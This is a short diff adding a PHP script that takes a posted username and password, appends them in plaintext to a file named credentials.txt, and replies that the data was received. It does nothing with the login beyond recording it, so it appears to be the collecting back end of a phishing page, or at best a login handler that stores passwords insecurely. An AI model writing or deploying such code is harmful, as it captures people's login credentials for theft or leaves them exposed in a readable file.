@@ -1,0 +1,9 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    // Aquí puedes guardar los datos en una base de datos o un archivo
+    file_put_contents('credentials.txt', "Usuario: $username\nContraseña: $password\n", FILE_APPEND);
+    echo "Datos recibidos exitosamente!";
+}
+?>
